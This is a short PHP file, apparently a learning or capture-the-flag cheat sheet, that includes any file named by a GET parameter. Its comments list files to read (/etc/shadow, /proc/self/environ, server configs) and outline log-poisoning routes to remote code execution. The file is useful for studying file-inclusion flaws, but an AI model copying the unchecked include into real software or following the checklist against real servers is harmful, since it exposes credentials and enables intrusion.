<?php
include_once($_GET['page']);
#require($_GET['page']);
#require_once($_GET['page']);
#echo file_get_contents($_GET['page']);
#
##########################################
# user information
# /etc/passwd
# /etc/shadow
#
# processs information
# /proc/self/cwd
# /proc/self/exe
# /proc/self/environ
# /proc/self/fd/[num]
# /proc/self/cmdline
# /proc/sched_debug   # process list
#
# network
# /etc/hosts
# /proc/net/fib_trie
# /proc/net/[tcp, udp]
# /proc/net/route
# /proc/net/arp
#
# config
# /etc/php/php.ini
# /etc/nginx/nginx.conf
# /etc/apache2/sites-available/000-default.conf
# /etc/apache2/apache2.conf
# /etc/httpd/conf/httpd.conf
# /etc/httpd/logs/access_log
# /etc/httpd/log/error_log
# /tmp/sess_{SESSION_ID}
#
# RCE
# 1. /var/log/auth.log or /var/log/secure # 先 ssh "惡意 code"@[victim]
# 2. /var/log/apache2/access.log or /var/log/httpd/access_log # nc [victim] 80 然後輸入惡意 code
# 3. /tmp/sess_{SESSION_ID} # 改寫自己的 session
# 4. /proc/self/environ # 將 user-agent 塞入惡意 code (通常沒權限讀)
#
# https://ithelp.ithome.com.tw/articles/10241555
?>
